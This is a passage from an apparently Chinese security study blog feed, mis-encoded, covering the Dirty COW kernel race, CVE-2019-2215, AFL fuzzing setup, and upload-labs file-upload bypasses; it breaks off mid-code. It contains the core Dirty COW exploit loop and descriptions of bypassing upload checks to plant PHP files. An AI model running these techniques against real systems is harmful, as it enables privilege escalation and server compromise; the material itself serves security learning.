src="http://handsomedog.top/wp-content/uploads//2020/01/%E8%84%8F%E7%89%9B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8.png" alt="img"></p><p>å¯ä»¥çœ‹åˆ°ä¸»è¦åŸå› ï¼š</p><p>åœ¨writeçš„è¿‡ç¨‹ä¸­ï¼ŒåŒ…å«ä¸¤ä¸ª<code>non-atomic</code>æ“ä½œï¼š<code>1ã€locate the physical address</code>ï¼Œ<code>2ã€and write to that address</code>å¯¼è‡´ç«äº‰æ¡ä»¶çš„å‘ç”Ÿã€‚ä¸‹é¢æ¥æ¢³ç†ä¸€ä¸‹åˆ©ç”¨æµç¨‹ï¼š</p><p>1ã€æ‰“å¼€ä¸€ä¸ªåªè¯»æ–‡ä»¶ï¼Œå°†å®ƒæ˜ å°„å†…å­˜ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> f = open(<span class="hljs-string">&quot;readonly_file&quot;</span>, O_RDONLY);<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stat</span> <span class="hljs-title">file_info</span>;</span><br>fstat(f, &amp;file_info);<br><span class="hljs-built_in">map</span> = mmap(<span class="hljs-literal">NULL</span>, file_info.st_size, PROT_READ, MAP_PRIVATE, f, <span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure><p>2ã€å°è¯•å»å†™è¿™ä¸ªæ–‡ä»¶ï¼Œè¿™æ˜¯è§¦å‘<code>copy on wirte</code>æœºåˆ¶ï¼Œä½†æ˜¯ç”±äº<code>write</code>é‚£ä¸¤ä¸ªéåŸå­æ“ä½œï¼Œæ‰€ä»¥å…¶ä»–è¿›ç¨‹å¯ä»¥é©³å…¥æ‰§è¡Œä»£ç ã€‚è¯•æƒ³ï¼š</p><p><img src="http://handsomedog.top/wp-content/uploads//2020/01/dirty_cow_1.png" alt="img"></p><p>å°è¯•å‘æ–‡ä»¶å†™å†…å®¹ï¼Œæ­¤æ—¶çŠ¶æ€å¦‚ä¸‹å›¾ï¼š</p><p><img src="http://handsomedog.top/wp-content/uploads//2020/01/dirty_cow_2.png" alt="img"></p><p>ç”±äºè§¦å‘äº†<code>copy on write</code>æœºåˆ¶ï¼ŒçŠ¶æ€å‘ç”Ÿå˜åŒ–ï¼š</p><p><img src="http://handsomedog.top/wp-content/uploads//2020/01/dirty_cow_3.png" alt="img"></p><p>æ­¤æ—¶æ”»å‡»è€…åˆ©ç”¨æ¡ä»¶ç«äº‰é©³å…¥ä»£ç ï¼Œå°†<code>private_mapping of root_file</code>é™¤å»ï¼ŒçŠ¶æ€å‘ç”Ÿå˜åŒ–ï¼š</p><p><img src="http://handsomedog.top/wp-content/uploads//2020/01/dirty_cow_4.png" alt="img"></p><p>å†æ¬¡å›åˆ°<code>write</code>è¿›ç¨‹æ—¶ï¼Œ<code>kernel</code>å·²ç»æŒ‡å‘åŸ<code>root_file</code>ï¼Œç›®çš„è¾¾æˆï¼š</p><p><img src="http://handsomedog.top/wp-content/uploads//2020/01/dirty_cow_5.png" alt="img"></p><p>æ‰€ä»¥éœ€è¦ä¸¤ä¸ªè¿›ç¨‹ï¼Œä¸€ä¸ªå°è¯•å»å†™ï¼Œä¸€ä¸ªå°è¯•å»é‡Šæ”¾ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs CQL">void *write_to_mapping (void *arg) &#123;<br>    // Write to mapping through &#x27;/proc/self/mem&#x27;.<br>    int i;<br>    for (i = 0; i &lt; 10000; i++) &#123;<br>        int f = open(&quot;/proc/self/mem&quot;, O_RDWR);<br>        lseek(f, (uintptr_t)map, SEEK_SET);<br>        write(f, to_be_written, strlen(to_be_written));<br>    &#125;<br>&#125;<br><br><br>void* drop_mapping (void *arg) &#123;<br>    // (m)advise kernel to drop mapping.<br>    int i;<br>    for (i = 0; i &lt; 10000; i++)<br>        madvise(map, 100, MADV_DONTNEED);<br>&#125;<br><br>pthread_t thread_1, thread_2;<br>pthread_create(&amp;thread_1, NULL, write_to_mapping, NULL);<br>pthread_create(&amp;thread_2, NULL, drop_mapping, NULL);<br>pthread_join(thread_1, NULL);<br>pthread_join(thread_2, NULL);<br></code></pre></td></tr></table></figure><h4 id="UAFï¼šCVE-2019-2215"><a href="#UAFï¼šCVE-2019-2215" class="headerlink" title="UAFï¼šCVE-2019-2215"></a>UAFï¼šCVE-2019-2215</h4><p>1ã€æ‰¾åˆ°æ¼æ´æè¿°ã€‚</p><p>2ã€æ‰¾åˆ°å¯¹åº”çš„å†…æ ¸ä»£ç ã€‚</p><p>3ã€æ‰¾åˆ°å¯¹åº”çš„POCå’ŒEXPã€‚</p><p>4ã€ç ”ç©¶æ¼æ´åˆ©ç”¨æ–¹å¼ã€‚</p><p><code>CVE-2019-2215</code>ç”±<code>Googleå…¬å¸Project Zero</code>å°ç»„å‘ç°ï¼Œå¹¶è¢«è¯¥å…¬å¸çš„å¨èƒåˆ†æå°ç»„ï¼ˆTAGï¼‰ç¡®è®¤å…¶å·²ç”¨äºå®é™…æ”»å‡»ä¸­ã€‚TAGè¡¨ç¤ºè¯¥æ¼æ´åˆ©ç”¨å¯èƒ½è·Ÿä¸€å®¶å‡ºå”®æ¼æ´å’Œåˆ©ç”¨å·¥å…·çš„ä»¥è‰²åˆ—å…¬å¸NSOæœ‰å…³ï¼ŒéšåNSOé›†å›¢å‘è¨€äººå…¬å¼€å¦è®¤ä¸è¯¥æ¼æ´å­˜åœ¨ä»»ä½•å…³ç³»ã€‚è¯¥æ¼æ´å®è´¨æ˜¯å†…æ ¸ä»£ç ä¸€å¤„UAFæ¼æ´ï¼ŒæˆåŠŸåˆ©ç”¨å¯ä»¥é€ æˆæœ¬åœ°æƒé™æå‡ï¼Œå¹¶æœ‰å¯èƒ½å®Œå…¨æ§åˆ¶ç”¨æˆ·è®¾å¤‡ã€‚ä½†è¦æˆåŠŸåˆ©ç”¨è¯¥æ¼æ´ï¼Œéœ€è¦æ»¡è¶³æŸäº›ç‰¹å®šæ¡ä»¶ã€‚</p><h5 id="ANDROID-BINDERç®€ä»‹ï¼š"><a href="#ANDROID-BINDERç®€ä»‹ï¼š" class="headerlink" title="ANDROID BINDERç®€ä»‹ï¼š"></a><code>ANDROID BINDER</code>ç®€ä»‹ï¼š</h5><p><code>IPC</code>æ˜¯<code>Inter-process communication</code>çš„ç¼©å†™ï¼Œå³è¿›ç¨‹é—´é€šä¿¡ã€‚<code>IPC</code>æ˜¯ä¸€ç§å…è®¸è¿›ç¨‹é—´äº’ç›¸é€šä¿¡äº¤æ¢æ•°æ®çš„æœºåˆ¶ã€‚åœ¨<code>Linux</code>å¹³å°ä¸Šï¼Œè¿›ç¨‹ä¹‹é—´æ˜¯éš”ç¦»çš„ï¼Œå„ä¸ªè¿›ç¨‹è¿è¡Œåœ¨è‡ªå·±çš„è™šæ‹Ÿåœ°å€ç©ºé—´ä¸­ï¼Œå¦‚æœä¸é‡‡å–IPCæ‰‹æ®µ,è¿›ç¨‹ä¹‹é—´æ˜¯ä¸èƒ½äº’ç›¸äº¤æ¢æ•°æ®çš„ã€‚ä¸ºäº†å®ç°è¿›ç¨‹ä¹‹é—´çš„æ•°æ®äº¤æ¢ï¼Œ<code>Linux</code>æä¾›äº†å¤šç§<code>IPC</code>æœºåˆ¶ï¼š</p><ul><li>ä¿¡å·ã€ç®¡é“ã€Socketã€æ¶ˆæ¯é˜Ÿåˆ—ã€ä¿¡å·é‡ã€å…±äº«å†…å­˜</li></ul><p><code>Android</code>æ˜¯åŸºäº<code>Linux</code>ç³»ç»Ÿå¼€å‘ï¼Œé™¤äº†ä¸Šé¢çš„<code>IPC</code>æœºåˆ¶ä»¥å¤–ï¼Œ<code>Android</code>åˆæä¾›äº†ä¸€ç§æ–°çš„é€‰æ‹©ï¼š<code>binder</code>ã€‚ç«™åœ¨ç³»ç»Ÿè§’åº¦æ¥çœ‹ï¼Œ<code>binder</code>çš„å®ç°åŒ…æ‹¬ï¼š</p><ul><li>ä¸€ä¸ª<code>Client</code>è¿›ç¨‹ã€ä¸€ä¸ª<code>Service</code>è¿›ç¨‹ã€<code>Binder</code>é©±åŠ¨ã€‚</li></ul><p><img src="http://handsomedog.top/wp-content/uploads//2020/01/binder_1.png" alt="img"></p><p>è€Œ<code>Binder Driver</code>ä½äºå†…æ ¸æ€ï¼Œæ‰€æœ‰è¿›ç¨‹éƒ½å¯ä»¥è®¿é—®ï¼Œä¸‹å›¾ä¸º<code>Binder</code>æ¶æ„ï¼š</p><p><img src="http://handsomedog.top/wp-content/uploads//2020/01/binder_2.png" alt="img"></p><p><code>vectored I/O</code>åŸºç¡€ï¼šIn computing, vectored I&#x2F;O, also known as scatter&#x2F;gather I&#x2F;O, is a method of input and output by which a single procedure call sequentially reads data from multiple buffers and writes it to a single data stream, or reads data from a data stream and writes it to multiple buffers, as defined in a vector of buffers.</p><h5 id="æ¼æ´-â€“-BINDER-LOCTL"><a href="#æ¼æ´-â€“-BINDER-LOCTL" class="headerlink" title="æ¼æ´ â€“ BINDER_LOCTL"></a>æ¼æ´ â€“ BINDER_LOCTL</h5><p>åœ¨binder_free_threadå‡½æ•°ä¸­ï¼Œå¯ä»¥è§¦å‘UAFã€‚</p><p>TO-DOã€æŒ–å‘ã€‚</p><h3 id="å¸¸ç”¨FuzzæŠ€æœ¯"><a href="#å¸¸ç”¨FuzzæŠ€æœ¯" class="headerlink" title="å¸¸ç”¨FuzzæŠ€æœ¯"></a>å¸¸ç”¨FuzzæŠ€æœ¯</h3><h4 id="AFL"><a href="#AFL" class="headerlink" title="AFL"></a>AFL</h4><p>æš´åŠ›fuzzerï¼Œå®‰å…¨ç ”ç©¶è€…å’Œçˆ±å¥½è€…åˆ©ç”¨å®ƒå·²ç»æœ‰äº†éå¸¸å¤šçš„äº§å‡ºã€‚</p><p>ç‰¹ç‚¹ï¼šinstrumentation-guidedã€genetic-algorithmã€edge coverage to guide fuzzingã€‚</p><p>AFLæ‰§è¡Œæµç¨‹ï¼š</p><ul><li>load user-supplied initial test cases into the queue.</li><li>Take next input file from the queue.</li><li>Attempt to trim the test case to the smallest size that doesnâ€™t alter the measure behavior of the program.</li><li>Repeatedly mutate the file using a balanced and well-researched variety of traditional fuzzing strategies.</li><li>If any of the generated mutations resulted in a new state transition recoreded by the instrumentation, add mutated output as a new entry in the queue.</li><li>go to 2.</li></ul><p>FuzzingæŠ€æœ¯æ˜¯å½“å‰æœ€ä¸ºå¼ºå¤§è€Œæœ‰æ•ˆçš„æ¼æ´æŒ–æ˜æŠ€æœ¯ï¼Œå¤§å¤šçš„è¿œç¨‹ä»£ç æ‰§è¡Œä»¥åŠæƒé™æå‡ç­‰è¾ƒä¸ºä¸¥é‡çš„æ¼æ´éƒ½æ˜¯é€šè¿‡Fuzzingè€Œäº§å‡ºçš„ã€‚AFL(American Fuzzy Lop)è¢«ç§°ä¸ºç›®å‰æœ€é«˜çº§çš„Fuzzingæµ‹è¯•å·¥å…·ä¹‹ä¸€ï¼Œå¯ä»¥æœ‰æ•ˆåœ°å¯¹äºŒè¿›åˆ¶ç¨‹åºè¿›è¡Œfuzzï¼Œå¼€å¯ç›¸åº”åŠŸèƒ½å¯æ›´æ·±å…¥çš„æ ¹æ®éœ€æ±‚æŒ–æ˜ç›¸å…³æ¼æ´ï¼Œå¦‚æ ˆæº¢å‡ºã€å †æº¢å‡ºã€UAFç­‰ã€‚</p><p>AFLæœ‰ä¸¤ç§fuzzé€”å¾„ï¼š</p><ul><li>å¼€æºè½¯ä»¶ï¼šAFLè½¯ä»¶è¿›è¡Œç¼–è¯‘çš„åŒæ—¶è¿›è¡Œæ’æ¡©ï¼Œä»¥æ–¹ä¾¿fuzz</li></ul><ol><li>é—­æºè½¯ä»¶ï¼šé…åˆQEMUç›´æ¥å¯¹é—­æºçš„äºŒè¿›åˆ¶ä»£ç è¿›è¡Œfuzz</li></ol><p>æ’æ¡©ï¼šåœ¨AFLç¼–è¯‘æ–‡ä»¶æ—¶å€™afl-gccä¼šåœ¨è§„å®šä½ç½®æ’å…¥æ¡©ä»£ç ï¼Œå¯ä»¥ç†è§£ä¸ºä¸€ä¸ªä¸ªçš„å°æ–­ç‚¹(ä½†æ˜¯æ²¡æœ‰æš‚åœåŠŸèƒ½)ï¼Œåœ¨åç»­fuzzçš„è¿‡ç¨‹ä¸­ä¼šæ ¹æ®è¿™äº›æ¡©ä»£ç è¿›è¡Œè·¯å¾„æ¢ç´¢ï¼Œæµ‹è¯•ç­‰ã€‚ä½¿å¾—æµ‹è¯•è¦†ç›–é¢æ›´å¹¿ï¼Œæ›´å…¨é¢ã€‚å¦å¤–ï¼Œåœ¨æ¯ä¸ªåˆ†æ”¯æ’å…¥æ¡©ä»£ç çš„åŒæ—¶ï¼Œ<code>afl-as</code>ä¼šç”Ÿæˆä¸€ä¸ªéšæœºæ•°ä½œä¸ºæ ‡è¯†è¿™ä¸ªä»£ç å—çš„<code>key</code>ï¼Œè¿è¡Œæ—¶ä¾¿å¯ä»¥åˆ©ç”¨è¿™äº›ç”Ÿæˆçš„éšæœºæ•°æ¥è¯†åˆ«ç›¸åº”ä»£ç å—ã€‚</p><p>AFLä¸»è¦æ˜¯ç”±ä¸‰éƒ¨åˆ†ç»„æˆï¼š</p><ul><li>ç¬¬ä¸€éƒ¨åˆ†ï¼šç¼–è¯‘å™¨<code>wrapper</code>ï¼šä»–çš„åŠŸèƒ½åœ¨äºå¯¹ç›®æ ‡è½¯ä»¶ï¼ˆå¼€æºï¼‰è¿›è¡Œç¼–è¯‘ï¼Œç¼–è¯‘è¿‡ç¨‹ä¸­æ’å…¥ä¸€äº›AFLè¯†åˆ«çš„å‡½æ•°ç”¨ä»¥è¯†åˆ«æ¢ç´¢è·¯å¾„ï¼Œä¼—æ‰€å‘¨çŸ¥çš„<code>linux</code>ä¸‹çš„<code>C/C++</code>ç¼–è¯‘å·¥å…·<code>gcc/g++</code>ï¼Œ<code>afl</code>çš„ç¼–è¯‘å·¥å…·ä¸º<code>afl-gcc/afl-g++,afl-clang</code>ç­‰ã€‚</li><li>ç¬¬äºŒéƒ¨åˆ†ï¼šæµ‹è¯•å™¨<code>fuzzerï¼šafl-fuzz</code>ï¼Œå°±æ˜¯AFLé‡è¦çš„ä¸»ä½“ï¼Œç”¨ä»¥å¯¹è½¯ä»¶è¿›è¡Œfuzzingã€‚</li><li>ç¬¬ä¸‰éƒ¨åˆ†ï¼šå¦‚<code>afl-cmin,afl-tmin</code>ï¼Œéƒ½æ˜¯ä¸ºæå‡æµ‹è¯•çš„æ•ˆç‡å’ŒæˆåŠŸç‡è€ŒæœåŠ¡çš„ã€‚</li></ul><p>å®‰è£…ï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">wget</span> http://lcamtuf.coredump.cx/afl/releases/afl-latest.tgz<br><span class="hljs-attribute">tar</span> -zxvf afl-<span class="hljs-number">2</span>.<span class="hljs-number">52</span>b.tgz<br><span class="hljs-attribute">cd</span> afl-<span class="hljs-number">2</span>.<span class="hljs-number">52</span>b<br><span class="hljs-attribute">make</span><br><span class="hljs-attribute">sudo</span>  make install<br></code></pre></td></tr></table></figure><p><code>ASAN(Address Sanitizer)</code>æ˜¯<code>linux</code>ä¸‹çš„å†…å­˜æ£€æµ‹å·¥å…·ï¼Œæ—©å…ˆæ˜¯<code>LLVM</code>ä¸­çš„ç‰¹æ€§ï¼Œåæ¥è¢«åŠ å…¥<code>GCC 4.9</code>ï¼Œç°è¢«<code>clang</code>å’Œ<code>gcc</code>æ”¯æŒï¼Œç”¨äºè¿è¡Œçš„æ—¶å€™å¯¹å†…å­˜è¿›è¡Œæ£€æµ‹ï¼Œä»¥è¾¾åˆ°å‘ç°å†…å­˜æ¼æ´çš„æ•ˆæœã€‚</p><p>åœ¨å¼€å¯<code>ASAN</code>åã€‚<code>afl</code>æ’æ¡©åˆ™ä¼šåœ¨ç›®æ ‡ä»£ç çš„å…³é”®ä½ç½®æ·»åŠ æ£€æŸ¥ä»£ç ï¼Œä¾‹å¦‚ï¼š<code>malloc(),free()</code>ç­‰ï¼Œä¸€æ—¦å‘ç°äº†å†…å­˜è®¿é—®é”™è¯¯ï¼Œä¾¿å¯ä»¥<code>SIGABRT</code>ä¸­æ­¢ç¨‹åºã€‚</p><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼š</p><ul><li>1ã€ä¾‹å¦‚è¶Šç•Œè¯»ç­‰å†…å­˜è®¿é—®é”™è¯¯ä¸ä¸€å®šä¼šé€ æˆç¨‹åºçš„å´©æºƒï¼Œæ‰€ä»¥åœ¨æ²¡æœ‰å¼€å¯ASANçš„æƒ…å†µä¸‹ï¼Œè®¸å¤šå†…å­˜æ¼æ´éƒ½æ— æ³•è¢«AFLç»™å‘ç°ã€‚æ‰€ä»¥åœ¨ç¼–è¯‘äºŒè¿›åˆ¶ä»£ç çš„æ—¶å€™ï¼Œå¼ºçƒˆå»ºè®®å¼€å¯ASANã€‚</li><li>2ã€ASANå¼€å¯åçš„fuzzingä¼šæ¶ˆè€—æ›´å¤šçš„å†…å­˜ï¼Œè¿™æ˜¯éœ€è¦æ³¨æ„çš„å› ç´ ï¼Œå¯¹äº32ä½çš„ç¨‹åºï¼ŒåŸºæœ¬ä¸Š800MBå³å¯ï¼›ä½†64ä¸ºç¨‹åºå¤§æ¦‚éœ€è¦20TB,æ‰€ä»¥ï¼Œä½¿ç”¨ASANçš„è¯ï¼Œå»ºè®®æ·»åŠ CFLAGS&#x3D;-m32æ¥é™åˆ¶ç¼–è¯‘ç›®æ ‡ä¸º32ä½ï¼Œå¦åˆ™ï¼Œå¯èƒ½åº”ä¸º64ä½æ¶ˆè€—å†…å­˜è¿‡å¤šè€Œé€ æˆç¨‹åºå´©æºƒã€‚</li><li>3ã€ åœ¨ä½¿ç”¨äº†ASANä¹‹åï¼Œå¯ä»¥å†alf-fuzzçš„æ—¶å€™é€šè¿‡é€‰é¡¹-mæ¥æŒ‡å®šä½¿ç”¨çš„å†…å­˜ä¸Šé™ã€‚å¯ç”¨äº†ASANçš„32ä½ç¨‹åºï¼Œä¸€èˆ¬è®¾ç½®-m 1024å³å¯ã€‚</li></ul><h4 id="Syzkaller"><a href="#Syzkaller" class="headerlink" title="Syzkaller"></a>Syzkaller</h4><p><img src="http://handsomedog.top/wp-content/uploads//2020/01/syzkaller.png" alt="img"></p><p>To be continueâ€¦</p><p>å› ä¸ºè‡ªå·±æ•´ç†çš„ä¸€ç‰‡ä¸€ç‰‡å¾ˆä¹±ï¼Œå¼•ç”¨äº†<a href="http://handsomedog.top/?p=461&from=timeline&isappinstalled=0">å¸…å¸…ç‹—å¸ˆå‚…çš„ç¬”è®°</a>ä½œä¸ºè®°è½½æ–¹ä¾¿å­¦ä¹ ï¼Œå·²å¾å¾—æœ¬äººåŒæ„ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>ç§»åŠ¨å®‰å…¨</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>Android</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>åŸºäºupload-labsçš„æ–‡ä»¶ä¸Šä¼ æ±‡æ€»</title>
    <link href="/2019/11/17/upload-labs/"/>
    <url>/2019/11/17/upload-labs/</url>
    
    <content type="html"><![CDATA[<p><img src="https://s2.ax1x.com/2020/02/09/1WX691.png" alt="1WX691.png"></p><h1 id="å‰ç«¯-js-æ ¡éªŒ"><a href="#å‰ç«¯-js-æ ¡éªŒ" class="headerlink" title="å‰ç«¯ js æ ¡éªŒ"></a>å‰ç«¯ js æ ¡éªŒ</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">checkFile</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">var</span> file = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementsByName</span>(<span class="hljs-string">&#x27;upload_file&#x27;</span>)[<span class="hljs-number">0</span>].<span class="hljs-property">value</span>;<br>    <span class="hljs-keyword">if</span> (file == <span class="hljs-literal">null</span> || file == <span class="hljs-string">&quot;&quot;</span>) &#123;<br>        <span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;è¯·é€‰æ‹©è¦ä¸Šä¼ çš„æ–‡ä»¶!&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-comment">//å®šä¹‰å…è®¸ä¸Šä¼ çš„æ–‡ä»¶ç±»å‹</span><br>    <span class="hljs-keyword">var</span> allow_ext = <span class="hljs-string">&quot;.jpg|.png|.gif&quot;</span>;<br>    <span class="hljs-comment">//æå–ä¸Šä¼ æ–‡ä»¶çš„ç±»å‹</span><br>    <span class="hljs-keyword">var</span> ext_name = file.<span class="hljs-title function_">substring</span>(file.<span class="hljs-title function_">lastIndexOf</span>(<span class="hljs-string">&quot;.&quot;</span>));<br>    <span class="hljs-comment">//åˆ¤æ–­ä¸Šä¼ æ–‡ä»¶ç±»å‹æ˜¯å¦å…è®¸ä¸Šä¼ </span><br>    <span class="hljs-keyword">if</span> (allow_ext.<span class="hljs-title function_">indexOf</span>(ext_name + <span class="hljs-string">&quot;|&quot;</span>) == -<span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-keyword">var</span> errMsg = <span class="hljs-string">&quot;è¯¥æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ ï¼Œè¯·ä¸Šä¼ &quot;</span> + allow_ext + <span class="hljs-string">&quot;ç±»å‹çš„æ–‡ä»¶,å½“å‰æ–‡ä»¶ç±»å‹ä¸ºï¼š&quot;</span> + ext_name;<br>        <span class="hljs-title function_">alert</span>(errMsg);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¸Šä¼ ä¹‹å‰ï¼Œé€šè¿‡<code>js</code>åˆ¤æ–­ä¸€ä¸‹æ–‡ä»¶åç¼€æ˜¯å¦ä¸º<code>.jpg</code>|<code>.png</code>|<code>.gif</code>,ä¸æ˜¯å°±ä¸å…è®¸ä¸Šä¼ ã€‚</p><p>ç»•è¿‡æ–¹æ³•</p><p>å¯¹äºå‰ç«¯<code>js</code>éªŒè¯çš„ç»•è¿‡æ–¹æ³•è¾ƒä¸ºç®€å•ï¼Œæˆ‘ä»¬å¯ä»¥å°†è¦ä¸Šä¼ çš„<code>php</code>æ–‡ä»¶æ”¹åç¼€åä¸º <code>jpg</code>|<code>png</code>|<code>gif</code>ï¼Œç»•è¿‡<code>js</code>éªŒè¯åï¼Œå†ç”¨<code>burpæ›´æ”¹ä¸Šä¼ è¯·æ±‚</code>ï¼Œæˆ–è€…æµè§ˆå™¨<code>ç¦ç”¨js</code>åè¿›è¡Œä¸Šä¼ ã€‚</p><h1 id="Content-Type-æ ¡éªŒ"><a href="#Content-Type-æ ¡éªŒ" class="headerlink" title="Content-Type æ ¡éªŒ"></a>Content-Type æ ¡éªŒ</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;<br>        <span class="hljs-keyword">if</span> ((<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-string">&#x27;image/jpeg&#x27;</span>) || (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-string">&#x27;image/png&#x27;</span>) || (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-string">&#x27;image/gif&#x27;</span>)) &#123;<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]            <br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;æ–‡ä»¶ç±»å‹ä¸æ­£ç¡®ï¼Œè¯·é‡æ–°ä¸Šä¼ ï¼&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>åç«¯phpä»£ç åªå¯¹Content-Typeè¿›è¡Œäº†æ£€æŸ¥</p><p>ç»•è¿‡æ–¹æ³•</p><p>åœ¨burpä¸­æ›´æ”¹Content-Typeè¿›è¡Œç»•è¿‡å³å¯</p><h1 id="é»‘åå•æ ¡éªŒ"><a href="#é»‘åå•æ ¡éªŒ" class="headerlink" title="é»‘åå•æ ¡éªŒ"></a>é»‘åå•æ ¡éªŒ</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;.asp&#x27;</span>,<span class="hljs-string">&#x27;.aspx&#x27;</span>,<span class="hljs-string">&#x27;.php&#x27;</span>,<span class="hljs-string">&#x27;.jsp&#x27;</span>);<br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">deldot</span>(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//åˆ 